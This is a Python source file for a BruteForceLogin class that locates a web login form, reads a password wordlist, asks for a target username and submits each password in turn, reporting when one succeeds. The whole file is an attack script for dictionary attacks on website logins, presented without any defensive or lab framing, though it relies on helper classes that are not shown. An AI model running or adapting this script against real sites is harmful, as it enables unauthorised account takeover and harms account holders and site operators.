import sys

from src.MessageAdministrator import MessageAdministrator


class BruteForceLogin:

    def __init__(self,
                 args_dictionary,
                 administrator,
                 timer,
                 finder,
                 reader,
                 service):

        self.args_dictionary = args_dictionary

        self.message_administrator = administrator
        self.timer = timer
        self.form_name_finder = finder
        self.dictionary_reader = reader
        self.browser_service = service

        self.execute()

    def execute(self):
        self.set_form()
        passwords = self.read_dictionary()
        username = input(MessageAdministrator.ENTER_USERNAME)

        self.timer.start()

        for password in passwords:
            self.try_password(password, username)

        self.username_unsuccessful(username)

    def set_form(self):
        form_name = self.form_name_finder.get_form_name(
            self.args_dictionary["url"],
            self.args_dictionary["username"],
            self.args_dictionary["passname"]
        )
        self.browser_service.set_form(form_name)

    def read_dictionary(self):
        passwords = self.dictionary_reader.read()
        return passwords

    def try_password(self, password, username_to_enter):
        self.browser_service.fill_form(
            self.args_dictionary["username"],
            self.args_dictionary["passname"],
            password,
            username_to_enter)
        self.check_password_validity(password)

    def check_password_validity(self, password):
        if self.browser_service.verify_url_has_changed():
            minutes_elapsed = self.timer.get_minutes_elapsed()
            self.print_password_found(minutes_elapsed, password)
            sys.exit(1)
        else:
            self.print_password_unsuccessful(password)

    def print_password_found(self, minutes_elapsed, password):
        self.message_administrator.print_password_found(minutes_elapsed, password)

    def print_password_unsuccessful(self, password):
        self.message_administrator.print_password_unsuccessful(password)

    def username_unsuccessful(self, username):
        self.message_administrator.print_username_not_found(username)
        sys.exit(1)




